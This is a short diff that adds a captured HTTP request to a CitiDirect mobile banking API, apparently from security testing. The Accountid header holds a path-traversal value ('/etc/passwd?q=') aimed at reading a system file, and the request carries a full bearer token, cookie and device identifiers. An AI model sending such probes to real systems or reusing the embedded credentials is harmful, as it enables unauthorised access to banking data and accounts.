@@ -1,1 +1,23 @@
-test2
+POST /cdm/api/ccms/v3/lists/balanceCashSummaryStmt HTTP/2
+Host: uat2.citidirect.com
+Cookie: x-citiportal-ua-track=UTTSCMCEMFJWWPSFPGFZWJESKOIIRAFG9638676403@1
+Accountid: /etc/passwd?q= 
+User-Agent: CitiDirectBE/5.2.0.520352 (Android;12)
+Uid: 
+Cache-Control: no-cache, no-store, must-revalidate
+Pragma: no-cache
+Expires: 0
+Application_type: mobileapp
+Langid: en
+Deviceprint: c1b6658740ff36f5
+Appversion: 11.3
+Userselectedregion: GLOBAL
+X-Ibm-Client-Id: 4801c7c4-cf0b-4d67-a4f7-eafb47bd03cb
+Authorization: Bearer eyJ6aXAiOiJERUYiLCJhbGciOiJSU0EtT0FFUC0yNTYiLCJlbmMiOiJBMjU2R0NNIiwiY3R5IjoiSldUIiwiaXNzIjoiZXBmdHRzLWNkbW9iaWxlLWp3dCIsImtpZCI6ImVwZnR0cy1jZG1vYmlsZS1qd3QifQ.Pj5aZmr8MqFWu454sBs27QRkiJV3K3Gt1OIly_TiVl-VVguiGMXjx1P5TTe-TKL3BpDoQK3SmjZEe1h5Iw-ZIHTGyPysfUbfDn4dMkai3oKTfz0qn_gQPKGK0JJDxlqKtrtmlqVlbfE7GgvHhTtPBhijzFfcSSIQW_zXnA2vN8wlJPOOUltjCKuwRkpMglgrCeqzZM7BVyu9AZINsz1xFNuHuaW4IqV-fbCSLK0CwGMVRq7qlVU_fInOQBW1LpzJl-Y3QErRrRi2hhK2GqDXc9gyNjCueg9_Jw_k4kS5HTaHZN5GSL2XCBB883-AXES77VNyZUcwraeoxQgA9CXcjg.AHw9_3_lC3m0T40r.zewaSAtMR3jjXd1E_zEGeCmr98ipXWMZCWEtWeTQgfxRMlILewfjpZCsy3fcFOiCXNPNqhV5CwCf7PyJlBVQys2PDxVo_xMxmxOr81PYy2kMKaCKb2sxymrUgZNxBmnzY61mf69YzQlawtFpr6b0tSAMe2WicQMdp1Q1h7zM2m6FQ81y2S2BiyPs5ml1hrNweE_l4S-d9W81dOowWilMQWlBNGMbGm4hkp96yZFJJbzzxsoznzBsgtr3iAH05FRyQv1rqfnOn69nAAVJR05gL9LdAWVT4wemjiufJ-zc235E9j_WDdhdAJ0EiZt8xLhwYSe2lBQb4pQdub25r9HXRKVWfRTDPkd07DcOoq4sjFApsQIh15j-pNbUktuaHpRpjARUI75TvUNQw1L7lF6MaaaUUozUDPMWR6H_-O40191xmbLsldTL_dCp0kkufTlerjXf_7HVa0lZWtaUJFezLbepuS5CIYviXaC8k64em6IP-Rt4BQcA8mKSh5yWPFM2Lbp-6WEJrmPlTt46NJf1FX_P9rQVfWQy-5ueIfR4iBft_V7D5abR9Y2_fvAqvR8bSgp8KgPG68p8G1-jercrOx7GDmHvyZAkM4RcLH1w-UuAYmCF1i7olsghbO88MA_quUJLL9jROdR6be62HyImkHF0ur0fV3Wwfz8qYpdDnTVqxJCuybk5DySYBY1MBqKq4mzCLaE9e4G9J7tk6_QEyteayB8YsQ.jVGelluWEAJ0ZInsoZfTfA
+X-Mobile-Code: 5f79f2fe-6cd6-44e4-8ca2-89b860179862
+X-Authcontext-Cache: true
+Content-Type: application/json
+Content-Length: 133
+Accept-Encoding: gzip, deflate, br
+
+{"limit":200,"offset":0,"fromDate":"2025-11-14","toDate":"2025-12-13","creditDebitMark":"ALL","sortBy":"valueDate","sortType":"DESC"}
